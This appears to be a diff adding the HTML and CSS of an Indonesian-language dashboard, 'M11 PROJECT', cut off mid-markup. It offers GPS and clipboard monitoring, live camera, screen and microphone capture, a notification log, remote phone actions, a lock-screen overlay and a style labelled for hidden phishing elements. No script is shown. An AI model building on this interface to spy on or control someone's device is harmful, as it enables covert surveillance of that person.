@@ -1,0 +1,3127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>M11 PROJECT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        :root {
+            --bg: #0f0608;
+            --bg-card: #1e0e13;
+            --bg-card-hover: #2a1319;
+            --accent: #ff6b9d;
+            --accent-soft: #ff8fab;
+            --accent-glow: rgba(255,107,157,0.3);
+            --text: #ffffff;
+            --text-sec: #c9a0b0;
+            --text-muted: #8a6a75;
+            --danger: #ff4757;
+            --success: #2ed573;
+            --warning: #ffa502;
+            --info: #70a1ff;
+            --border: rgba(255,107,157,0.1);
+        }
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse at 20% 20%, rgba(255,107,157,0.08) 0%, transparent 50%),
+                        radial-gradient(ellipse at 80% 80%, rgba(255,107,157,0.05) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .particles {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            width: 3px; height: 3px;
+            background: var(--accent);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: floatUp linear infinite;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+        
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            pointer-events: none;
+        }
+        .toast {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text);
+            font-size: 13px;
+            font-weight: 500;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            animation: toastIn 0.4s ease, toastOut 0.4s ease 2.6s forwards;
+            backdrop-filter: blur(20px);
+            min-width: 280px;
+        }
+        .toast i { font-size: 16px; }
+        .toast.success { border-color: rgba(46,213,115,0.3); }
+        .toast.success i { color: var(--success); }
+        .toast.error { border-color: rgba(255,71,87,0.3); }
+        .toast.error i { color: var(--danger); }
+        .toast.info { border-color: rgba(255,107,157,0.3); }
+        .toast.info i { color: var(--accent); }
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateY(-20px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        @keyframes toastOut {
+            from { opacity: 1; transform: translateY(0) scale(1); }
+            to { opacity: 0; transform: translateY(-20px) scale(0.9); }
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+        .modal {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            transform: scale(0.9);
+            transition: transform 0.3s;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-overlay.active .modal { transform: scale(1); }
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .modal-header h3 { font-size: 18px; font-weight: 600; }
+        .modal-close {
+            width: 36px; height: 36px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        .modal-close:hover { background: var(--danger); color: white; border-color: var(--danger); }
+        .modal-body { color: var(--text-sec); font-size: 14px; line-height: 1.6; }
+        .modal-body input, .modal-body textarea {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 14px;
+            margin-bottom: 12px;
+            transition: all 0.3s;
+        }
+        .modal-body input:focus, .modal-body textarea:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+        .modal-body textarea { min-height: 100px; resize: vertical; }
+        
+        #dashboard-page {
+            min-height: 100vh;
+            position: relative;
+            z-index: 2;
+            padding-bottom: 80px;
+        }
+        .dash-header {
+            padding: 20px 20px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(180deg, var(--bg), transparent);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(20px);
+        }
+        .dash-header-left { display: flex; align-items: center; gap: 12px; }
+        .user-avatar {
+            width: 42px; height: 42px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--accent), var(--accent-soft));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            box-shadow: 0 4px 15px var(--accent-glow);
+        }
+        .user-info h3 { font-size: 15px; font-weight: 600; }
+        .user-info p { font-size: 11px; color: var(--text-muted); }
+        .dash-header-right { display: flex; gap: 12px; }
+        .icon-btn {
+            width: 40px; height: 40px;
+            border-radius: 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-sec);
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+        .icon-btn:hover {
+            background: var(--bg-card-hover);
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+        
+        .status-bar {
+            margin: 0 20px 20px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+        .status-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 14px 10px;
+            text-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .status-item:hover {
+            background: var(--bg-card-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        }
+        .status-item i { font-size: 18px; color: var(--accent); margin-bottom: 6px; }
+        .status-item .val { font-size: 14px; font-weight: 700; display: block; }
+        .status-item .lab { font-size: 9px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
+        
+        .device-info-card {
+            margin: 0 20px 20px;
+            background: linear-gradient(135deg, var(--bg-card), rgba(255,107,157,0.05));
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .device-info-card::before {
+            content: '';
+            position: absolute;
+            top: 0; right: 0;
+            width: 100px; height: 100px;
+            background: radial-gradient(circle, var(--accent-glow), transparent);
+            opacity: 0.5;
+        }
+        .device-info-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 14px;
+            position: relative;
+        }
+        .device-info-header i { color: var(--accent); font-size: 18px; }
+        .device-info-header h4 { font-size: 14px; font-weight: 600; }
+        .device-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            position: relative;
+        }
+        .device-info-item {
+            background: rgba(0,0,0,0.2);
+            border-radius: 12px;
+            padding: 12px;
+        }
+        .device-info-item .di-label {
+            font-size: 10px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+        .device-info-item .di-value {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text);
+            word-break: break-all;
+        }
+        
+        .section-title {
+            margin: 24px 20px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .section-title i { color: var(--accent); font-size: 14px; }
+        .section-title h3 { font-size: 15px; font-weight: 600; }
+        .section-title span {
+            margin-left: auto;
+            font-size: 11px;
+            color: var(--text-muted);
+            background: var(--bg-card);
+            padding: 4px 10px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+        }
+        
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 0 20px;
+        }
+        .feature-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 18px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .feature-card:hover::before { opacity: 1; }
+        .feature-card:hover {
+            background: var(--bg-card-hover);
+            transform: translateY(-4px);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.4), 0 0 30px var(--accent-glow);
+            border-color: rgba(255,107,157,0.3);
+        }
+        .feature-card:active { transform: scale(0.95); }
+        .feature-icon {
+            width: 44px; height: 44px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, rgba(255,107,157,0.15), rgba(255,107,157,0.05));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-size: 18px;
+            color: var(--accent);
+            transition: all 0.3s;
+        }
+        .feature-card:hover .feature-icon {
+            background: linear-gradient(135deg, var(--accent), var(--accent-soft));
+            color: white;
+            box-shadow: 0 4px 15px var(--accent-glow);
+        }
+        .feature-name { font-size: 11px; font-weight: 500; color: var(--text-sec); line-height: 1.3; }
+        
+        .control-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 0 20px;
+        }
+        .control-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+        .control-card::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .control-card:hover::after { opacity: 1; }
+        .control-card:hover {
+            background: var(--bg-card-hover);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            border-color: rgba(255,107,157,0.25);
+        }
+        .control-card:active { transform: scale(0.97); }
+        .control-icon {
+            width: 40px; height: 40px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, rgba(255,107,157,0.15), rgba(255,107,157,0.05));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: var(--accent);
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        .control-card:hover .control-icon {
+            background: linear-gradient(135deg, var(--accent), var(--accent-soft));
+            color: white;
+        }
+        .control-text { flex: 1; }
+        .control-text .ct-name { font-size: 13px; font-weight: 600; margin-bottom: 2px; }
+        .control-text .ct-desc { font-size: 10px; color: var(--text-muted); }
+        
+        .bottom-nav {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            background: rgba(30,14,19,0.95);
+            backdrop-filter: blur(30px);
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0 20px;
+            z-index: 100;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--text-muted);
+            font-size: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            padding: 4px 12px;
+            border-radius: 12px;
+        }
+        .nav-item i { font-size: 20px; }
+        .nav-item.active { color: var(--accent); }
+        .nav-item.active i { filter: drop-shadow(0 0 8px var(--accent-glow)); }
+        
+        .terminal {
+            background: #0a0507;
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: var(--text-sec);
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .terminal-line { margin-bottom: 4px; display: flex; gap: 8px; }
+        .terminal-time { color: var(--accent); flex-shrink: 0; }
+        .terminal-msg { color: var(--text-sec); }
+        .terminal-msg.success { color: var(--success); }
+        .terminal-msg.error { color: var(--danger); }
+        .terminal-msg.warn { color: var(--warning); }
+        
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255,107,157,0.3);
+            transform: scale(0);
+            animation: rippleAnim 0.6s ease-out;
+            pointer-events: none;
+        }
+        @keyframes rippleAnim {
+            to { transform: scale(4); opacity: 0; }
+        }
+        
+        .fade-in-up {
+            animation: fadeInUp 0.5s ease forwards;
+            opacity: 0;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .delay-1 { animation-delay: 0.1s; }
+        .delay-2 { animation-delay: 0.2s; }
+        .delay-3 { animation-delay: 0.3s; }
+        .delay-4 { animation-delay: 0.4s; }
+        
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 4px; }
+        
+        .toggle-switch {
+            width: 48px; height: 26px;
+            background: var(--bg-card);
+            border-radius: 13px;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid var(--border);
+        }
+        .toggle-switch.active {
+            background: var(--accent);
+            border-color: var(--accent);
+        }
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            top: 2px; left: 2px;
+            width: 20px; height: 20px;
+            background: white;
+            border-radius: 50%;
+            transition: all 0.3s;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+        }
+        .toggle-switch.active::after {
+            left: 24px;
+        }
+        
+        /* ===== KAMERA LIVE ===== */
+.camera-container {
+    position: relative;
+    width: 100%;
+    border-radius: 20px;
+    overflow: hidden;
+    background: #000;
+    aspect-ratio: 16/9;
+}
+.camera-container video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+.camera-container video.mirrored {
+    transform: scaleX(-1);
+}
+.camera-overlay {
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    padding: 16px;
+    background: linear-gradient(transparent, rgba(0,0,0,0.8));
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+}
+.cam-btn {
+    padding: 10px 16px;
+    background: rgba(255,255,255,0.15);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 12px;
+    color: white;
+    font-family: 'Outfit', sans-serif;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+.cam-btn:hover { background: var(--accent); border-color: var(--accent); }
+.cam-btn.active { background: var(--accent); border-color: var(--accent); }
+.cam-rec-dot {
+    width: 10px; height: 10px;
+    background: var(--danger);
+    border-radius: 50%;
+    animation: blink 1s infinite;
+    display: none;
+}
+.cam-recording .cam-rec-dot { display: block; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+/* ===== SCREEN SHARE ===== */
+.screen-container {
+    position: relative;
+    width: 100%;
+    border-radius: 20px;
+    overflow: hidden;
+    background: #000;
+    aspect-ratio: 16/9;
+}
+.screen-container video {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    display: block;
+}
+.screen-controls {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-top: 12px;
+    flex-wrap: wrap;
+}
+
+/* ===== ADD DEVICE / REMOTE PEER ===== */
+.peer-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    margin-bottom: 16px;
+}
+.peer-card {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 14px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+.peer-card:hover {
+    border-color: var(--accent);
+    transform: translateY(-2px);
+}
+.peer-card .peer-status {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    display: inline-block;
+    margin-right: 6px;
+}
+.peer-status.online { background: var(--success); box-shadow: 0 0 8px var(--success); }
+.peer-status.offline { background: var(--danger); }
+.peer-status.connecting { background: var(--warning); animation: blink 1s infinite; }
+.peer-name { font-size: 13px; font-weight: 600; }
+.peer-ip { font-size: 11px; color: var(--text-muted); margin-top: 2px; }
+.peer-actions {
+    display: flex;
+    gap: 6px;
+    margin-top: 8px;
+}
+.peer-action-btn {
+    flex: 1;
+    padding: 8px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    color: var(--text);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.3s;
+    font-family: 'Outfit', sans-serif;
+}
+.peer-action-btn:hover { background: var(--accent); border-color: var(--accent); }
+.peer-video-grid {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 10px;
+    margin-top: 12px;
+}
+.peer-video-box {
+    position: relative;
+    background: #000;
+    border-radius: 14px;
+    overflow: hidden;
+    aspect-ratio: 16/9;
+}
+.peer-video-box video {
+    width: 100%; height: 100%;
+    object-fit: cover;
+}
+.peer-video-label {
+    position: absolute;
+    top: 10px; left: 10px;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(10px);
+    padding: 4px 10px;
+    border-radius: 8px;
+    font-size: 11px;
+    font-weight: 600;
+}
+
+/* ===== MIKROFON LIVE ===== */
+.mic-container {
+    position: relative;
+    width: 100%;
+    border-radius: 20px;
+    overflow: hidden;
+    background: linear-gradient(135deg, #1e0e13, #0a0507);
+    border: 1px solid var(--border);
+    padding: 20px;
+}
+.mic-visualizer {
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+    gap: 3px;
+    height: 80px;
+    margin: 16px 0;
+}
+.mic-bar {
+    width: 6px;
+    background: linear-gradient(to top, var(--accent), var(--accent-soft));
+    border-radius: 3px;
+    transition: height 0.05s ease;
+    min-height: 4px;
+}
+.mic-status {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-sec);
+}
+.mic-dot {
+    width: 10px; height: 10px;
+    background: var(--danger);
+    border-radius: 50%;
+    animation: blink 1s infinite;
+}
+.mic-controls {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-top: 16px;
+    flex-wrap: wrap;
+}
+
+/* ===== NOTIFIKASI LOG ===== */
+.notif-container {
+    max-height: 300px;
+    overflow-y: auto;
+}
+.notif-item {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 14px;
+    margin-bottom: 10px;
+    transition: all 0.3s;
+    animation: slideIn 0.3s ease;
+}
+@keyframes slideIn {
+    from { opacity: 0; transform: translateX(-20px); }
+    to { opacity: 1; transform: translateX(0); }
+}
+.notif-item:hover {
+    border-color: var(--accent);
+    transform: translateX(4px);
+}
+.notif-app {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+}
+.notif-app i {
+    width: 28px; height: 28px;
+    border-radius: 8px;
+    background: var(--bg-card);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    color: var(--accent);
+}
+.notif-app-name {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+.notif-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 4px;
+}
+.notif-body {
+    font-size: 12px;
+    color: var(--text-sec);
+    line-height: 1.4;
+}
+.notif-time {
+    font-size: 10px;
+    color: var(--text-muted);
+    margin-top: 6px;
+}
+.notif-empty {
+    text-align: center;
+    padding: 40px;
+    color: var(--text-muted);
+    font-size: 13px;
+}
+.notif-badge {
+    position: absolute;
+    top: -4px; right: -4px;
+    width: 18px; height: 18px;
+    background: var(--danger);
+    border-radius: 50%;
+    font-size: 10px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    animation: pulse 1.5s infinite;
+}
+@keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.2); }
+}
+
+/* ===== LOCK SCREEN ===== */
+.lock-overlay {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    z-index: 999999;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-family: 'Outfit', sans-serif;
+}
+.lock-overlay.active {
+    display: flex;
+}
+.lock-icon {
+    font-size: 64px;
+    color: var(--accent);
+    margin-bottom: 20px;
+    animation: lockPulse 2s infinite;
+}
+@keyframes lockPulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.7; }
+}
+.lock-text {
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
+.lock-sub {
+    font-size: 14px;
+    color: var(--text-muted);
+    margin-bottom: 30px;
+}
+.lock-timer {
+    font-size: 48px;
+    font-weight: 800;
+    color: var(--accent);
+    font-variant-numeric: tabular-nums;
+}
+.lock-hint {
+    position: absolute;
+    bottom: 40px;
+    font-size: 12px;
+    color: var(--text-muted);
+    text-align: center;
+    padding: 0 20px;
+}
+
+/* ===== PHISHING HIDDEN ===== */
+.phish-hidden { display: none !important; 
+}
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    <div class="toast-container" id="toastContainer"></div>
+    
+    <div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <h3 id="modalTitle">Title</h3>
+                <div class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></div>
+            </div>
+            <div class="modal-body" id="modalBody">Content</div>
+        </div>
+    </div>
+
+    <!-- DASHBOARD ONLY -->
+    <div id="dashboard-page">
+        <div class="dash-header">
+            <div class="dash-header-left">
+                <div class="user-avatar">M</div>
+                <div class="user-info">
+                    <h3>M11 PROJECT</h3>
+                    <p id="dashStatus">● Online</p>
+                </div>
+            </div>
+            <div class="dash-header-right">
+                <div class="icon-btn" onclick="location.reload()"><i class="fas fa-sync"></i></div>
+            </div>
+        </div>
+        
+        <div class="status-bar fade-in-up">
+            <div class="status-item" onclick="showBatteryDetails()">
+                <i class="fas fa-battery-three-quarters"></i>
+                <span class="val" id="batteryText">--%</span>
+                <span class="lab">Battery</span>
+            </div>
+            <div class="status-item" onclick="showNetworkDetails()">
+                <i class="fas fa-signal"></i>
+                <span class="val" id="signalText">--</span>
+                <span class="lab">Network</span>
+            </div>
+            <div class="status-item" onclick="showIPDetails()">
+                <i class="fas fa-wifi"></i>
+                <span class="val" id="ipText">--</span>
+                <span class="lab">IP Address</span>
+            </div>
+        </div>
+        
+        <div class="device-info-card fade-in-up delay-1">
+            <div class="device-info-header">
+                <i class="fas fa-mobile-alt"></i>
+                <h4>Device Information</h4>
+            </div>
+            <div class="device-info-grid">
+                <div class="device-info-item">
+                    <div class="di-label">Device Name</div>
+                    <div class="di-value" id="deviceName">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">OS Version</div>
+                    <div class="di-value" id="osVersion">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">Platform</div>
+                    <div class="di-value" id="platform">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">Cores</div>
+                    <div class="di-value" id="cores">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">Memory</div>
+                    <div class="di-value" id="memory">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">Screen</div>
+                    <div class="di-value" id="screen">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">Language</div>
+                    <div class="di-value" id="language">--</div>
+                </div>
+                <div class="device-info-item">
+                    <div class="di-label">Online</div>
+                    <div class="di-value" id="online">--</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section-title fade-in-up delay-2">
+            <i class="fas fa-eye"></i>
+            <h3>Monitoring</h3>
+            <span>Real-time</span>
+        </div>
+        <div class="feature-grid fade-in-up delay-2">
+            <div class="feature-card" onclick="showLocation()">
+                <div class="feature-icon"><i class="fas fa-map-marker-alt"></i></div>
+                <div class="feature-name">GPS Location</div>
+            </div>
+            <div class="feature-card" onclick="showClipboard()">
+                <div class="feature-icon"><i class="fas fa-clipboard"></i></div>
+                <div class="feature-name">Clipboard</div>
+            </div>
+            <div class="feature-card" onclick="showNetwork()">
+                <div class="feature-icon"><i class="fas fa-network-wired"></i></div>
+                <div class="feature-name">Network Info</div>
+            </div>
+            <div class="feature-card" onclick="showSystemInfo()">
+                <div class="feature-icon"><i class="fas fa-microchip"></i></div>
+                <div class="feature-name">System Info</div>
+            </div>
+            <div class="feature-card" onclick="showStorage()">
+                <div class="feature-icon"><i class="fas fa-hdd"></i></div>
+                <div class="feature-name">Storage</div>
+            </div>
+            <div class="feature-card" onclick="showPermissions()">
+                <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                <div class="feature-name">Permissions</div>
+            </div>
+        </div>
+        
+        <div class="section-title fade-in-up delay-3">
+            <i class="fas fa-gamepad"></i>
+            <h3>Remote Control</h3>
+            <span>Device</span>
+        </div>
+        <div class="control-grid fade-in-up delay-3">
+            <div class="control-card" onclick="toggleFlash()">
+                <div class="control-icon"><i class="fas fa-bolt"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Flashlight</div>
+                    <div class="ct-desc" id="flashStatus">Tap to toggle</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="triggerVibrate()">
+                <div class="control-icon"><i class="fas fa-mobile"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Vibrate</div>
+                    <div class="ct-desc">Trigger vibration</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="showToastText()">
+                <div class="control-icon"><i class="fas fa-comment-alt"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Show Toast</div>
+                    <div class="ct-desc">Display text on screen</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="sendTTS()">
+                <div class="control-icon"><i class="fas fa-volume-up"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">TTS Voice</div>
+                    <div class="ct-desc">Text to speech</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="openWeb()">
+                <div class="control-icon"><i class="fas fa-globe"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Open URL</div>
+                    <div class="ct-desc">Launch browser</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="makeCall()">
+                <div class="control-icon"><i class="fas fa-phone"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Dial Number</div>
+                    <div class="ct-desc">Phone call</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="playSound()">
+                <div class="control-icon"><i class="fas fa-music"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Play Sound</div>
+                    <div class="ct-desc">Audio beep</div>
+                </div>
+            </div>
+            <div class="control-card" onclick="controlSelf()">
+                <div class="control-icon"><i class="fas fa-cog"></i></div>
+                <div class="control-text">
+                    <div class="ct-name">Self Control</div>
+                    <div class="ct-desc">Fullscreen, wake lock</div>
+                </div>
+            </div>
+        </div>
+                <!-- KAMERA LIVE -->
+        <div class="section-title fade-in-up delay-2">
+            <i class="fas fa-camera"></i>
+            <h3>Live Camera</h3>
+            <span id="camStatus">OFF</span>
+        </div>
+        <div style="margin: 0 20px 20px;" class="fade-in-up delay-2">
+            <div class="camera-container" id="camContainer">
+                <video id="camVideo" autoplay playsinline muted></video>
+                <div class="camera-overlay" id="camOverlay" style="display:none;">
+                    <button class="cam-btn" onclick="switchCam()">
+                        <i class="fas fa-sync-alt"></i> Switch
+                    </button>
+                    <button class="cam-btn" onclick="toggleMirror()" id="mirrorBtn">
+                        <i class="fas fa-columns"></i> Mirror: OFF
+                    </button>
+                    <button class="cam-btn" onclick="takePhoto()">
+                        <i class="fas fa-camera"></i> Capture
+                    </button>
+                    <button class="cam-btn" onclick="toggleRecording()" id="recBtn">
+                        <span class="cam-rec-dot"></span> REC
+                    </button>
+                    <button class="cam-btn" onclick="stopCamera()" style="background:var(--danger);border-color:var(--danger);">
+                        <i class="fas fa-stop"></i> Stop
+                    </button>
+                </div>
+            </div>
+            <div style="display:flex;gap:10px;justify-content:center;margin-top:12px;">
+                <button class="cam-btn" onclick="startCamera('user')" style="background:var(--accent);border-color:var(--accent);">
+                    <i class="fas fa-user"></i> Front Cam
+                </button>
+                <button class="cam-btn" onclick="startCamera('environment')" style="background:var(--accent);border-color:var(--accent);">
+                    <i class="fas fa-video"></i> Back Cam
+                </button>
+            </div>
+            <canvas id="photoCanvas" style="display:none;"></canvas>
+        </div>
+
+        <!-- SCREEN SHARE -->
+        <div class="section-title fade-in-up delay-3">
+            <i class="fas fa-desktop"></i>
+            <h3>Screen Capture</h3>
+            <span id="screenStatus">OFF</span>
+        </div>
+        <div style="margin: 0 20px 20px;" class="fade-in-up delay-3">
+            <div class="screen-container" id="screenContainer">
+                <video id="screenVideo" autoplay playsinline></video>
+            </div>
+            <div class="screen-controls">
